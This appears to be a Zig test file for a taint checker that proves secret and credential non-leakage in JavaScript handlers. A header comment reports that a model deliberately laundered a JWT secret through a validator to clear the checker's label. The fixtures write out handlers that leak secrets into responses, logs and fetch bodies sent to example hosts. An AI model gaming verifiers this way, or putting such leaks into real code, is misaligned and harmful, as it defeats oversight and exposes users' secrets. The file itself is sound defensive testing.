// `env("JWT_SECRET")` routed through `validateJson` and returned in the body
// proved `no_secret_leakage`. Found by a model, which wrote the shape
// deliberately during a codegen recording and said in its own commentary that
// it did so to clear the credential label. See
// docs/solutions/security-issues/validate-json-strips-the-label-it-was-asked-to-check.md.
//
// The rule now: such an export discharges `user_input` and nothing else.

test "validateJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("s", "{}");
        \\  const r = validateJson("s", env("JWT_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "coerceJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { schemaCompile, coerceJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("s", "{}");
        \\  const r = coerceJson("s", env("JWT_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "decodeJson does not launder a secret" {
    // A second module, which is what makes this a rule about the shape of an
    // export rather than a defect in one row of one registry.
    const source =
        \\import { env } from "zttp:env";
        \\import { decodeJson } from "zttp:decode";
        \\function handler(req) {
        \\  const r = decodeJson(env("JWT_SECRET"), "");
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "escapeHtml does not launder a secret" {
    // Escaping defends against injection. It does not make a secret public,
    // which the renderToString arm already said and this family did not.
    const source =
        \\import { env } from "zttp:env";
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: escapeHtml(env("JWT_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "validateJson does not launder a credential" {
    // The shape the model actually wrote: verified claims round-tripped
    // through the validator to clear the `credential` label.
    const source =
        \\import { env } from "zttp:env";
        \\import { parseBearer, jwtVerify } from "zttp:auth";
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("claims", "{}");
        \\  const result = jwtVerify(parseBearer(req.headers["authorization"]), env("JWT_SECRET"));
        \\  const claims = validateJson("claims", JSON.stringify(result.value));
        \\  return Response.json({ claims: claims.value });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "a validator still discharges user input" {
    // The discharge is the one label these exports are entitled to clear, and
    // the fix must not take it away: this is the ordinary validation path, and
    // demoting it would make every validated handler unprovable.
    const source =
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("user", "{}");
        \\  const r = validateJson("user", req.body);
        \\  return Response.json({ ok: r.value });
        \\}
    ;
    try std.testing.expect(try runInputValidated(std.testing.allocator, source));
}

// The same conflation, one module further on, and without the discharge that
// made the validator family arguable: a dictionary holds what was put in it,
// and a JSON document is its input in another shape. Both modules declared no
// labels at all, so both answered the empty set and every label the argument
// carried was dropped. Measured before the fix: the first of these proved
// `no_secret_leakage` with the secret in the response body.

test "a dictionary does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const d = dictSet(dictEmpty(), "k", env("API_SECRET"));
        \\  return Response.json({ v: dictGet(d, "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "stringifyJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { stringifyJson } from "zttp:json";
        \\function handler(req) {
        \\  const r = stringifyJson(env("API_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sseEvents does not launder a secret through its success arm" {
    const source =
        \\import { env } from "zttp:env";
        \\import { sseEvents } from "zttp:sse";
        \\function handler(req) {
        \\  const framed = sseEvents(env("PROVIDER_SECRET"), {
        \\    maxBodyBytes: 8388608,
        \\    maxBlockBytes: 8388608,
        \\    maxEvents: 65536,
        \\  });
        \\  return Response.json({ events: framed.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sseEvents does not launder a secret through its error offset" {
    const source =
        \\import { env } from "zttp:env";
        \\import { sseEvents } from "zttp:sse";
        \\function handler(req) {
        \\  const framed = sseEvents(env("PROVIDER_SECRET"), {
        \\    maxBodyBytes: 8388608,
        \\    maxBlockBytes: 8388608,
        \\    maxEvents: 65536,
        \\  });
        \\  return Response.json({ offset: framed.error.offset });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "base64Encode does not launder a secret" {
    // The sharpest row of the family: the output is the input, in another
    // alphabet. Nothing about it is even arguably a declassification.
    const source =
        \\import { env } from "zttp:env";
        \\import { base64Encode } from "zttp:crypto";
        \\function handler(req) {
        \\  return Response.json({ v: base64Encode(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sha256 does not launder a secret" {
    // The arguable row, and marked for the reason it is arguable. A hash is
    // one-way, so "it is safe now" is available to say - and neither this
    // registry nor the analysis can check it, while an unsalted hash of a
    // low-entropy secret is recoverable. A declassification is spelled by an
    // export that declares what it clears, the way `mask` does below.
    const source =
        \\import { env } from "zttp:env";
        \\import { sha256 } from "zttp:crypto";
        \\function handler(req) {
        \\  return Response.json({ v: sha256(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a text transform does not launder a secret" {
    // A second module, and one nobody would think of as a security boundary,
    // which is the point: the shape is what decides, not the module's subject.
    const source =
        \\import { env } from "zttp:env";
        \\import { slugify } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: slugify(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask still declassifies, because that is what it is for" {
    // The deliberate declassifier, pinned so the sweep that marked its
    // neighbours cannot quietly take it with them. `mask` exists to make a
    // secret printable; an export that unioned its input back in would have no
    // reason to exist.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: mask(env("API_SECRET"), 4) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "the direct return of a secret is refused" {
    // The control for the two probes below. Without it a `false` from either
    // one could mean the harness refuses everything, which would make the
    // probe pass while checking nothing.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  return Response.json({ v: env("API_SECRET") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "scope.using does not launder the resource it hands back" {
    // `using` returns argument 0 unchanged at runtime. It declared
    // `returns_from_param = .identity` and no `derives_from_args`, and
    // `scanImports` populates `module_fn_arg_derived` from that field alone, so
    // the identity return was never wired to label propagation: the call was
    // credited with closure labels only and the secret arrived unlabelled.
    const source =
        \\import { env } from "zttp:env";
        \\import { using } from "zttp:scope";
        \\function handler(req) {
        \\  return Response.json({ v: using(env("API_SECRET"), (r) => r) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "scope.using does not launder a credential either" {
    const source =
        \\import { using } from "zttp:scope";
        \\function handler(req) {
        \\  const token = req.headers.get("authorization");
        \\  return Response.json({ v: using(token, (r) => r) });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "scope.using still proves clean for an ordinary resource" {
    // The pass-through has to keep working for the handlers it exists for.
    // A propagating export is only useful if it does not refuse those.
    const source =
        \\import { using } from "zttp:scope";
        \\function handler(req) {
        \\  return Response.json({ v: using("plain", (r) => r) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a secret written to the cache and read back is not proven clean" {
    // The read call holds no reference to what the write put there, so the
    // checker cannot follow the provenance - and the export answered with a
    // benign `.internal` label rather than with ignorance. That reported
    // `no_secret_leakage` PROVEN for a secret round-tripped through the store.
    //
    // `derives_from_args` is the WRONG fix here and is a no-op:
    // `argDerivedLabels` unions only the current call's own arguments, which
    // for `cacheGet("ns", "k")` are two string literals - never the secret a
    // separate `cacheSet` wrote. The primitive that fits is `.unknown`.
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", env("API_SECRET"));
        \\  return Response.json({ v: cacheGet("ns", "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a queue read is not proven clean" {
    const source =
        \\import { env } from "zttp:env";
        \\import { send, receive } from "zttp:queue";
        \\function handler(req) {
        \\  send("q", env("API_SECRET"));
        \\  return Response.json({ v: receive("q") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql row read is not proven clean" {
    const source =
        \\import { sqlOne } from "zttp:sql";
        \\function handler(req) {
        \\  return Response.json({ row: sqlOne("getUser") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql row set read is not proven clean" {
    const source =
        \\import { sqlMany } from "zttp:sql";
        \\function handler(req) {
        \\  return Response.json({ rows: sqlMany("listUsers") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a durable signal payload is not proven clean" {
    // `waitSignalNative` returns `callbacks.wait_signal_fn(...)` directly -
    // literally the `payload` argument of a separate `signal(key, name,
    // payload)` call - and relabelled it `.external`.
    const source =
        \\import { waitSignal } from "zttp:durable";
        \\function handler(req) {
        \\  return Response.json({ v: waitSignal("approved") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a rate-limit counter is still proven clean" {
    // The control that keeps the sweep honest. `rateCheck` declares
    // `.internal` in the same shape as the five store reads, and is correctly
    // excluded: it returns a counter derived from the limiter's own state, and
    // no caller ever writes a value into it. Marking it `.unknown` would cost
    // every rate-limited handler three properties for no provenance gap.
    const source =
        \\import { rateCheck } from "zttp:ratelimit";
        \\function handler(req) {
        \\  return Response.json({ allowed: rateCheck("ip", 10, 60) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with a request-controlled bound declassifies nothing" {
    // `mask` reveals the trailing `visible` bytes, so `visible` decides how
    // much of the secret survives. It was an unbounded runtime `.number`, and
    // the pinning test above only ever passed a literal 4 - so a bound read
    // off the request handed the caller a dial on the declassification.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\import { bytesLength } from "zttp:bytes";
        \\function handler(req) {
        \\  const n = bytesLength(requestBody(req));
        \\  return Response.json({ v: mask(env("API_SECRET"), n) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with a computed bound declassifies nothing either" {
    // Not only request-derived bounds: the question is whether the magnitude
    // is fixed at compile time, and an identifier bound to anything is not.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  const n = 4 + 4;
        \\  return Response.json({ v: mask(env("API_SECRET"), n) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with its default bound still declassifies" {
    // The argument is optional and the default is fixed at compile time, so
    // omitting it is as bounded as writing the literal.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: mask(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "ordinary text through the same exports still proves clean" {
    // The control for the whole sweep. Propagating every argument label is only
    // useful if it does not refuse the handlers these modules exist for.
    const source =
        \\import { sha256 } from "zttp:crypto";
        \\import { slugify } from "zttp:text";
        \\import { urlEncode } from "zttp:url";
        \\function handler(req) {
        \\  const title = "hello world";
        \\  return Response.json({ a: sha256(title), b: slugify(title), c: urlEncode(title) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a dictionary of ordinary data still proves clean" {
    // The control. Propagating every argument label is only useful if it does
    // not refuse the handlers the module exists for: nothing labelled goes in
    // here, so nothing labelled comes out.
    const source =
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const d = dictSet(dictEmpty(), "k", "v");
        \\  return Response.json({ v: dictGet(d, "k") });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a clock read reaching the response costs determinism" {
    // `Date.now()` is a global member call, so it carries no import to seed a
    // label from. The label is attached to the read itself and follows the
    // binding into the response body.
    const source =
        \\function handler(req) {
        \\  const at = Date.now();
        \\  return Response.json({ at: at });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a random draw reaching the response costs determinism" {
    const source =
        \\function handler(req) { return Response.json({ roll: Math.random() }); }
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a clock read reaching only a log keeps determinism" {
    // The direction the capability rule cannot express: the timestamp reaches
    // stderr and stops, so the two runs answer the same body.
    const source =
        \\import { logInfo } from "zttp:log";
        \\function handler(req) {
        \\  logInfo("served", { at: Date.now() });
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a clock read behind a helper reaches the response" {
    // The call summary collects the helper's return labels, so the read does
    // not launder through a wrapper the way it would if only the handler body
    // were walked.
    const source =
        \\function stamp() { return Date.now(); }
        \\function handler(req) { return Response.json({ at: stamp() }); }
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a shadowed Date does not carry the varying label" {
    // `Date` here is a local object, not the global, so its `now()` is whatever
    // the handler defined. Labelling it would demote a handler that is in fact
    // deterministic.
    const source =
        \\function handler(req) {
        \\  const Date = { now: () => 7 };
        \\  return Response.json({ at: Date.now() });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "no flow diagnostic offers a repair a guard cannot perform" {
    // Every kind in this checker reports that a labelled value reached a sink.
    // The label is what fails the proof, and `insert_guard_before_line` inserts
    // a conditional - it cannot remove a label, and `.validated` is conferred
    // only by a validator call (validateJson, validateObject, schemaCompile,
    // renderToString), never by an `if`. So every repair intent this checker
    // offered was one that could not clear the diagnostic offering it.
    //
    // That was survivable while the intent never reached the model. Once
    // diagnostics started carrying `repair_intent` to the agent, a recorded
    // case spent its whole attempt budget on it: "Hmm, what does
    // insert_guard_before_line mean for secret taint? Possibly wrapping the
    // response in a branch that verifies the secret? No..." and "A guard before
    // line 24: e.g., check `values.appName === undefined`? That doesn't remove
    // taint." A wrong repair is worse than none, because none is silent.
    //
    // Read off diagnostics the checker emitted, not off a struct this test
    // built. An earlier version constructed its own `Diagnostic` literal per
    // enum member and asserted `repair_intent == null` on it: that field's
    // declared default is null, so the loop asserted the struct default and
    // would have passed with every emission site in this file setting an
    // intent. `kindsTrippedByProbeCorpus` runs the checker instead, and its
    // coverage floor below fails when a kind stops being reachable - a corpus
    // that trips nothing must not read as a pass.
    var seen = std.EnumSet(DiagnosticKind).initEmpty();
    for (repair_intent_probe_corpus) |source| {
        try collectFlowDiagnosticKinds(std.testing.allocator, source, &seen);
    }
    inline for (@typeInfo(DiagnosticKind).@"enum".fields) |field| {
        const kind = @field(DiagnosticKind, field.name);
        if (!seen.contains(kind)) {
            std.debug.print("no probe source trips flow kind '{s}'\n", .{field.name});
            return error.FlowProbeCorpusMissesKind;
        }
    }
}

/// One handler per `DiagnosticKind`, so the probe above reads a real emission
/// for every member of the enum rather than a default it wrote itself.
const repair_intent_probe_corpus = [_][]const u8{
    // secret_in_response
    \\import { env } from "zttp:env";
    \\function handler(req) { return Response.json({ v: env("SECRET_KEY") }); }
    ,
    // credential_in_response
    \\function handler(req) { return Response.json({ v: req.headers.authorization }); }
    ,
    // secret_in_log
    \\import { env } from "zttp:env";
    \\function handler(req) {
    \\  console.log(env("SECRET_KEY"));
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_log
    \\function handler(req) {
    \\  console.log(req.headers.authorization);
    \\  return Response.json({ ok: true });
    \\}
    ,
    // secret_in_egress_url
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch(env("SECRET_URL"));
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_egress_url
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch(req.headers.authorization);
    \\  return Response.json({ ok: true });
    \\}
    ,
    // secret_in_egress_body
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: env("SECRET_KEY") });
    \\  return Response.json({ ok: true });
    \\}
    ,
    // unvalidated_input_in_egress
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: req.body });
    \\  return Response.json({ ok: true });
    \\}
    ,
};

/// Run the FlowChecker over `source`, record which kinds it emitted, and refuse
/// any diagnostic that carries a repair intent.
fn collectFlowDiagnosticKinds(
    allocator: std.mem.Allocator,
    source: []const u8,
    seen: *std.EnumSet(DiagnosticKind),
) !void {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |diagnostic| {
        seen.insert(diagnostic.kind);
        if (diagnostic.repair_intent != null) {
            std.debug.print(
                "flow kind '{s}' carries a repair intent\n",
                .{@tagName(diagnostic.kind)},
            );
            return error.FlowDiagnosticOffersUnperformableRepair;
        }
    }
}

// ---------------------------------------------------------------------------
// Declared classifications (M4 T4): P8 statuses and P9 enforcement
// ---------------------------------------------------------------------------

const declared_test_json =
    \\{"version":1,"classifications":[
    \\ {"source":"fetch:api.example.com","path":"customer.tax_id","label":"secret","required":true,"reason":"Tax identifier."},
    \\ {"source":"service:billing","path":"card.token","label":"credential","required":false,"reason":"Payment token."}]}
;

const DeclaredRun = struct {
    no_secret_leakage: bool,
    no_credential_leakage: bool,
    statuses: [2]EntryStatus,
    /// Whether some diagnostic names the declared tax-id entry.
    reason_named: bool,
};

/// Parse `source`, install the test declaration (unless `with_declaration` is
/// false), run the flow checker, and report what it established.
fn runDeclared(source: []const u8, with_declaration: bool) !DeclaredRun {
    const allocator = std.testing.allocator;
    var parsed = try declaration.parse(allocator, declared_test_json);
    var decl = switch (parsed) {
        .ok => |d| d,
        .refused => return error.TestDeclarationRefused,
    };
    defer decl.deinit();
    _ = &parsed;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = @import("handler_verifier.zig").findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    if (with_declaration) try checker.setDeclaration(&decl);
    _ = try checker.check(handler_fn);

    var run = DeclaredRun{
        .no_secret_leakage = checker.getProperties().no_secret_leakage,
        .no_credential_leakage = checker.getProperties().no_credential_leakage,
        .statuses = .{ .absent, .absent },
        .reason_named = false,
    };
    if (with_declaration) @memcpy(&run.statuses, checker.classificationStatuses());
    for (checker.getDiagnostics()) |diag| {
        if (std.mem.indexOf(u8, diag.message, "fetch:api.example.com customer.tax_id") != null) run.reason_named = true;
    }
    return run;
}

fn declaredHandler(comptime body: []const u8) []const u8 {
    return
    \\import { fetch } from "zttp:fetch";
    \\import { validateJson } from "zttp:validate";
    \\function handler(req) {
    \\  const r = fetch("https://api.example.com/customers/1");
    \\  const body = r.json();
    \\
    ++ body ++
        \\
        \\}
    ;
}

test "AE4: a declared secret is refused on every path to the response" {
    const cases = [_][]const u8{
        // The field itself.
        declaredHandler("  return Response.json({ t: body.customer.tax_id });"),
        // Through a const alias of the aggregate.
        declaredHandler("  const c = body.customer;\n  return Response.json({ t: c.tax_id });"),
        // A part of the field.
        declaredHandler("  return Response.json({ t: body.customer.tax_id.last4 });"),
        // A projection into a new object.
        declaredHandler("  const p = { id: body.customer.tax_id };\n  return Response.json(p);"),
        // Validation does not remove it.
        declaredHandler("  const v = validateJson(\"Customer\", r.body);\n  if (v.ok) { return Response.json(v.value); }\n  return Response.json({});"),
        // Serialization does not remove it.
        declaredHandler("  return Response.text(JSON.stringify(body.customer));"),
        // The whole-body text.
        declaredHandler("  return Response.text(r.text());"),
        // Through a helper that reads the field from the aggregate.
        declaredHandler("  const pick = (c) => c.tax_id;\n  return Response.json({ t: pick(body.customer) });"),
        // P9 (a): the whole aggregate, the whole body, the whole response.
        declaredHandler("  return Response.json(body.customer);"),
        declaredHandler("  return Response.json(body);"),
        declaredHandler("  return Response.json({ r: r });"),
        // A computed read.
        declaredHandler("  return Response.json({ t: body.customer[\"tax_id\"] });"),
        // A later write into the aggregate does not let a read launder it.
        declaredHandler("  const c = body.customer;\n  c.name = c.tax_id;\n  return Response.json({ n: c.name });"),
    };
    for (cases, 0..) |source, i| {
        const run = try runDeclared(source, true);
        if (run.no_secret_leakage) {
            std.debug.print("case {d} was admitted:\n{s}\n", .{ i, source });
            return error.TestExpectedRefusal;
        }
    }
}

test "the same reads are admitted for a sibling field, a local object, and another host" {
    const cases = [_][]const u8{
        // A sibling of the declared field.
        declaredHandler("  return Response.json({ n: body.customer.name });"),
        declaredHandler("  const c = body.customer;\n  return Response.json({ n: c.name });"),
        // P9 (b): the same last segment under another parent, same source.
        declaredHandler("  return Response.json({ t: body.other.tax_id });"),
        // P9 (b): a local object with the same short name.
        declaredHandler("  const local = { tax_id: \"x\" };\n  return Response.json({ t: local.tax_id });"),
        // Response metadata is not the body.
        declaredHandler("  return Response.json({ s: r.status });"),
        // Another host, same path.
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = fetch("https://other.example.com/customers/1");
        \\  const body = r.json();
        \\  return Response.json({ t: body.customer.tax_id });
        \\}
        ,
    };
    for (cases, 0..) |source, i| {
        const run = try runDeclared(source, true);
        if (!run.no_secret_leakage) {
            std.debug.print("case {d} was refused:\n{s}\n", .{ i, source });
            return error.TestExpectedAdmission;
        }
    }
    // Without a declaration the declared read is admitted too: the refusals
    // above come from the declaration and nothing else.
    const undeclared = try runDeclared(declaredHandler("  return Response.json({ t: body.customer.tax_id });"), false);
    try std.testing.expect(undeclared.no_secret_leakage);
}

test "a fetch whose host cannot be named applies every fetch entry, indeterminate" {
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = fetch(["https://", req.url].join(""));
        \\  const body = r.json();
        \\  return Response.json({ t: body.customer.tax_id });
        \\}
    ;
    const run = try runDeclared(source, true);
    try std.testing.expect(!run.no_secret_leakage);
    try std.testing.expectEqual(EntryStatus.indeterminate, run.statuses[0]);
}

test "a literal host matches without regard to case" {
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = fetch("https://API.Example.COM/customers/1");
        \\  return Response.json({ t: r.json().customer.tax_id });
        \\}
    ;
    const run = try runDeclared(source, true);
    try std.testing.expect(!run.no_secret_leakage);
    try std.testing.expectEqual(EntryStatus.matched, run.statuses[0]);
}

test "a declared credential from a service is refused and a sibling admitted" {
    const refused =
        \\import { serviceCall } from "zttp:service";
        \\function handler(req) {
        \\  const s = serviceCall("billing", "GET /card", {});
        \\  const b = s.json();
        \\  return Response.json({ t: b.card.token });
        \\}
    ;
    const run = try runDeclared(refused, true);
    try std.testing.expect(!run.no_credential_leakage);
    try std.testing.expectEqual(EntryStatus.matched, run.statuses[1]);

    const sibling =
        \\import { serviceCall } from "zttp:service";
        \\function handler(req) {
        \\  const s = serviceCall("billing", "GET /card", {});
        \\  return Response.json({ l: s.json().card.last4 });
        \\}
    ;
    try std.testing.expect((try runDeclared(sibling, true)).no_credential_leakage);
}

test "P8: each classification reports matched, indeterminate, or absent" {
    const Case = struct { source: []const u8, status: EntryStatus };
    const cases = [_]Case{
        .{ .source = declaredHandler("  return Response.json({ t: body.customer.tax_id });"), .status = .matched },
        // Reached only as an aggregate that is forwarded.
        .{ .source = declaredHandler("  return Response.json(body.customer);"), .status = .indeterminate },
        // The whole body, forwarded by name.
        .{ .source = declaredHandler("  return Response.json(body);"), .status = .indeterminate },
        // A computed read below the source root.
        .{ .source = declaredHandler("  const k = \"tax_id\";\n  return Response.json({ t: body.customer[k] });"), .status = .indeterminate },
        // Reading only a sibling reaches no aggregate above the field.
        .{ .source = declaredHandler("  return Response.json({ n: body.customer.name });"), .status = .absent },
        // The source is never read.
        .{ .source = "function handler(req) { return Response.json({ ok: true }); }", .status = .absent },
    };
    for (cases, 0..) |case, i| {
        const run = try runDeclared(case.source, true);
        if (run.statuses[0] != case.status) {
            std.debug.print("case {d}: expected {s}, got {s}\n", .{ i, @tagName(case.status), @tagName(run.statuses[0]) });
            return error.TestUnexpectedStatus;
        }
    }
    // Census: every status is driven by a case above.
    for (std.meta.tags(EntryStatus)) |status| {
        var seen = false;
        for (cases) |case| {
            if (case.status == status) seen = true;
        }
        try std.testing.expect(seen);
    }
}

test "a leak diagnostic names the declared entry behind it" {
    const run = try runDeclared(declaredHandler("  return Response.json({ t: body.customer.tax_id });"), true);
    try std.testing.expect(run.reason_named);
}

test "AE18: a declared secret round-tripped through the cache is not proven clean" {
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  const r = fetch("https://api.example.com/customers/1");
        \\  cacheSet("customers", "tax", r.json().customer.tax_id, 60);
        \\  return Response.json({ t: cacheGet("customers", "tax") });
        \\}
    ;
    try std.testing.expect(!(try runDeclared(source, true)).no_secret_leakage);
}

test "AE19: mask keeps a declared label under a runtime bound and declassifies under a literal" {
    const runtime_bound =
        \\import { fetch } from "zttp:fetch";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  const r = fetch("https://api.example.com/customers/1");
        \\  const n = req.url.length;
        \\  return Response.json({ t: mask(r.json().customer.tax_id, n) });
        \\}
    ;
    try std.testing.expect(!(try runDeclared(runtime_bound, true)).no_secret_leakage);

    const literal_bound =
        \\import { fetch } from "zttp:fetch";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  const r = fetch("https://api.example.com/customers/1");
        \\  return Response.json({ t: mask(r.json().customer.tax_id, 4) });
        \\}
    ;
    try std.testing.expect((try runDeclared(literal_bound, true)).no_secret_leakage);
}

test "FlowChecker keeps user_input on identity reads when the request escapes the write scan" {
    const allocator = std.testing.allocator;
    const escaping = [_][]const u8{
        // A function from another file could write req.subject.
        \\import { fetch } from "zttp:fetch";
        \\import { stamp } from "./stamp.ts";
        \\function handler(req) {
        \\  stamp(req);
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({});
        \\}
        ,
        // A method call receives it: the callee is not a name the scan resolves.
        \\import { fetch } from "zttp:fetch";
        \\const box = { take: (r) => r.method };
        \\function handler(req) {
        \\  box.take(req);
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({});
        \\}
        ,
        // An alias the scan cannot follow.
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = req;
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({});
        \\}
        ,
    };
    for (escaping, 0..) |source, i| {
        if (try runInputValidated(allocator, source)) {
            std.debug.print("case {d} kept identity reads clean:\n{s}\n", .{ i, source });
            return error.TestExpectedUserInput;
        }
    }
    // A built-in module export and a function declared in this file may
    // receive the request: the read stays clean.
    try std.testing.expect(try runInputValidated(allocator,
        \\import { fetch } from "zttp:fetch";
        \\import { routerMatch } from "zttp:router";
        \\function show(r) { return r.method; }
        \\const routes = { "POST /a": show };
        \\function handler(req) {
        \\  routerMatch(routes, req);
        \\  show(req);
        \\  fetch("https://api.example.com/v1", { body: req.subject });
        \\  return Response.json({});
        \\}
    ));
}
